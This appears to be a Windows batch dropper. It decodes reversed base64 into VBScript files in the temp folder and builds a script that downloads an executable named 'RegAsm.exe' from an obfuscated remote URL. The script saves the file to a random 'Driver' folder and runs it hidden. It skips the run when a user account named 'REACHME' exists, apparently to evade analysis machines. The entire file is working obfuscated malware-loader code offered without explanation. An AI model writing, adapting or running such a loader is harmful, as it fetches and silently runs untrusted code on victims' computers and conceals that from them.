@echo off
setlocal
set VBS1=%TEMP%\1cpKHgvGGf.vbs
set VBS2=%TEMP%\2cpKAgvGGf.vbs
set VBS3=%TEMP%\3cpKAgvGGf.vbs

echo xMHcuEzdv4Wah12LzRWYlh2LzZWZy9yZhJ2LtFmcUNmch10Lt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHa>tmp.rev1.b64
echo xMHcuIzdv4Wah12LzRWYlh2LzZWZy9yZhJ2LtFmcUNmch10Lt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHa>tmp.rev2.b64

powershell -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.String]::Join('', (Get-Content tmp.rev1.b64))[-1..0] -join '')))" > %VBS1%
powershell -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(([System.String]::Join('', (Get-Content tmp.rev2.b64))[-1..0] -join '')))" > %VBS2%

echo Dim a, b, c, d, e, f, g, h, i, j : a = "==QZ4VmLtNXQnVmUv4Wah12LzRWYlh2LzZWZy9ydhJ3LkVWamlmclZ3LtFmcUNmch10Lt92YuIWdoRXan9yL6MHc0RHa" : Set b = CreateObject("Scripting.FileSystemObject") : Set c = CreateObject("WScript.Shell") : d = c.ExpandEnvironmentStrings("%%TEMP%%") : Randomize : e = "Driver" & Int((9999 - 1000 + 1) * Rnd + 1000) : f = d & "\" & e : If Not b.FolderExists(f) Then b.CreateFolder f : g = f & "\RegAsm.exe" : h = m(StrReverse(a)) : n h, g : If Not o("REACHME") Then c.Run g , 0, False : Function m(x) : Dim y, z : Set y = CreateObject("MSXML2.DOMDocument") : Set z = y.createElement("base64") : z.dataType = "bin.base64" : z.Text = x : m = p(z.nodeTypedValue) : End Function : Function p(q) : Dim r : Set r = CreateObject("ADODB.Stream") : r.Type = 1 : r.Open : r.Write q : r.Position = 0 : r.Type = 2 : r.Charset = "utf-8" : p = r.ReadText : r.Close : End Function : Sub n(s, t) : Dim u, v : Set u = CreateObject("MSXML2.XMLHTTP") : u.Open "GET", s, False : u.Send : If u.Status = 200 Then : Set v = CreateObject("ADODB.Stream") : v.Type = 1 : v.Open : v.Write u.responseBody : v.SaveToFile t, 2 : v.Close : End If : End Sub : Function o(w) : Dim x, y, z : Set x = GetObject("winmgmts:\\.\root\cimv2") : Set y = x.ExecQuery("Select * from Win32_UserAccount Where Name='" & w & "'") : o = (y.Count > 0) : End Function > %VBS3%

del tmp.rev*.b64
cscript //nologo %VBS1%
timeout /t 10 /nobreak >nul
cscript //nologo %VBS2%
timeout /t 10 /nobreak >nul
cscript //nologo %VBS3%
endlocal
